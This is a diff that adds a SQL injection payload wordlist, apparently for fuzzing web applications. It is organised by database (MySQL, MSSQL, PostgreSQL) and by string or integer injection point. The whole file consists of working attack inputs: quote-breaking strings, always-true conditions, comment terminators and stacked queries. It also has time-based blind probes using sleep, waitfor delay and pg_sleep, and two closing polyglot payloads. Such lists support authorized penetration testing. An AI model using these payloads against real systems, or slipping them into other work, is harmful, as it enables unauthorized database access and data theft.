@@ -1,0 +1,301 @@
+### MySQL Valid Queries in SELECT WHERE String Injection ###
+### Note that SQL -- comments must be followed by a whitespace character and then any character
+''
+';
+';-- -
+';#
+'/*asdf*/
+'||1;
+'||1;-- -
+' or 1;
+' or 1;#
+' or 1;-- -
+' or 1=1;
+' or 1=1;#
+' or 1=1;-- -
+' or '1'='1';
+' or '1'='1';#
+' or '1'='1';-- -
+' and 1=1;
+' and 1=1;#
+' and 1=1;-- -
+' and '1'='1';
+' and '1'='1';#
+' and '1'='1';-- -
+' order by 1;
+' order by 1;#
+' order by 1;-- -
+' or sleep(5);
+' or sleep(5)='
+' or sleep(5);#
+' or sleep(5);-- -
+' and sleep(5);
+' and sleep(5);#
+' and sleep(5);-- -
+';select sleep(5);
+';select sleep(5);#
+';select sleep(5);-- -
+'')
+');
+');-- -
+');#
+')/*asdf*/
+')||1;
+')||1;-- -
+') or 1;
+') or 1;#
+') or 1;-- -
+') or 1=1;
+') or 1=1;#
+') or 1=1;-- -
+') or '1'='1';
+') or '1'='1';#
+') or '1'='1';-- -
+') and 1=1;
+') and 1=1;#
+') and 1=1;-- -
+') and '1'='1';
+') and '1'='1';#
+') and '1'='1';-- -
+') order by 1;
+') order by 1;#
+') order by 1;-- -
+') or sleep(5);
+') or sleep(5)='
+') or sleep(5);#
+') or sleep(5);-- -
+') and sleep(5);
+') and sleep(5);#
+') and sleep(5);-- -
+');select sleep(5);
+');select sleep(5);#
+');select sleep(5);-- -
+ 
+### MySQL Errors in SELECT WHERE String Injection ###
+'
+')
+'-- -
+'#
+';/*
+'/*
+'/*asdf*/'
+'||
+'||-- -
+' or 1=1
+' or '1'='1
+' or '1'='1'
+') or ('1'='1
+' order by 1000;
+
+### MySQL Valid Queries in SELECT WHERE Int Injection ###
+-1
++1
+-1;
++1;
+-1;-- -
++1;-- -
+;
+;-- -
+;#
++1;
++1;-- -
++1;#
+/*asdf*/
+||1;
+||1;-- -
+ or 1;
+ or 1;#
+ or 1;-- -
+ or 1=1;
+ or 1=1;#
+ or 1=1;-- -
+ or '1'='1';
+ or '1'='1';#
+ or '1'='1';-- -
+ and 1=1;
+ and 1=1;#
+ and 1=1;-- -
+ and '1'='1';
+ and '1'='1';#
+ and '1'='1';-- -
+ order by 1;
+ order by 1;#
+ order by 1;-- -
+ or sleep(5);
+ or sleep(5);#
+ or sleep(5);-- -
+ and sleep(5);
+ and sleep(5);#
+ and sleep(5);-- -
+;select sleep(5);
+;select sleep(5);#
+;select sleep(5);-- -
+);
+);-- -
+);#
+)/*asdf*/
+)||1;
+)||1;-- -
+) or 1;
+) or 1;#
+) or 1;-- -
+) or 1=1;
+) or 1=1;#
+) or 1=1;-- -
+) or '1'='1';
+) or '1'='1';#
+) or '1'='1';-- -
+) and 1=1;
+) and 1=1;#
+) and 1=1;-- -
+) and '1'='1';
+) and '1'='1';#
+) and '1'='1';-- -
+) order by 1;
+) order by 1;#
+) order by 1;-- -
+) or sleep(5);
+) or sleep(5);#
+) or sleep(5);-- -
+) and sleep(5);
+) and sleep(5);#
+) and sleep(5);-- -
+);select sleep(5);
+);select sleep(5);#
+);select sleep(5);-- -
+
+### MySQL Errors in SELECT WHERE Int Injection ###
+)
+-- -
+#
+;/*
+/*
+/*asdf*/'
+||
+ or 1=1
+ or '1'='1
+ or '1'='1'
+ order by 1000;
+
+### MSSQL Additional Valid Queries in SELECT WHERE String Injection ###
+' or 1
+' or 1=1
+' or '1'='1'
+' and 1=1
+' and '1'='1'
+' order by 1
+')
+') or 1
+') or 1=1
+') or '1'='1'
+') and 1=1
+') and '1'='1'
+') order by 1
+"
+" or 1
+" or 1=1
+" or "1"="1"
+" and 1=1
+" and "1"="1"
+" order by 1
+")
+") or 1
+") or 1=1
+") or "1"="1"
+") and 1=1
+") and "1"="1"
+") order by 1
+' waitfor delay '00:00:05'
+' waitfor delay '00:00:05'--
+') waitfor delay '00:00:05'
+') waitfor delay '00:00:05'--
+" waitfor delay "00:00:05"
+" waitfor delay "00:00:05"--
+") waitfor delay "00:00:05"
+") waitfor delay "00:00:05"--
+';waitfor delay '00:00:05'
+';waitfor delay '00:00:05'--
+');waitfor delay '00:00:05'
+');waitfor delay '00:00:05'--
+";waitfor delay "00:00:05"
+";waitfor delay "00:00:05"--
+");waitfor delay "00:00:05"
+");waitfor delay "00:00:05"--
+
+### MSSQL Additional Errors in SELECT WHERE String Injection ###
+"
+")
+"--
+"#
+";/*
+"/*
+"/*asdf*/"
+"||
+" or 1=1
+" or "1"="1
+" or "1"="1"
+") or ("1"="1
+" order by 1000
+" order by 1000;
+" order by 1000;#
+" order by 1000;--
+
+### MSSQL Additional Valid Queries in SELECT WHERE Int Injection ###
+ or 1
+ or 1=1
+ or '1'='1'
+ and 1=1
+ and '1'='1'
+ order by 1
+)
+) or 1
+) or 1=1
+) or '1'='1'
+) and 1=1
+) and '1'='1'
+ order by 1
+ or "1"="1"
+ and "1"="1"
+) or "1"="1"
+) and "1"="1"
+ waitfor delay '00:00:05'
+ waitfor delay '00:00:05'--
+;waitfor delay '00:00:05'
+;waitfor delay '00:00:05'--
+) waitfor delay '00:00:05'
+) waitfor delay '00:00:05'--
+);waitfor delay '00:00:05'
+);waitfor delay '00:00:05'--
+
+### MSSQL Additional Errors in SELECT WHERE String Injection ###
+ or 1=1
+ or "1"="1
+ or "1"="1"
+) or ("1"="1
+ order by 1000
+ order by 1000;
+ order by 1000;#
+
+### PostgreSQL Additional Valid Queries in SELECT WHERE String Injection ###
+';select pg_sleep(5);
+';select pg_sleep(5);--
+');select pg_sleep(5);
+');select pg_sleep(5);--
+
+### PostgreSQL Errors in SELECT WHERE String Injection ###
+
+### PostgreSQL Additional Valid Queries in SELECT WHERE Int Injection ###
+;select pg_sleep(5);
+;select pg_sleep(5);--
+);select pg_sleep(5);
+);select pg_sleep(5);--
+
+### PostgreSQL Errors in SELECT WHERE Int Injection ###
+### Oracle Additional Valid Queries in SELECT WHERE String Injection ###
+### Oracle Errors in SELECT WHERE String Injection ###
+### Oracle Additional Valid Queries in SELECT WHERE Int Injection ###
+### Oracle Errors in SELECT WHERE Int Injection ###
+
+### Polyglots ###
+SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
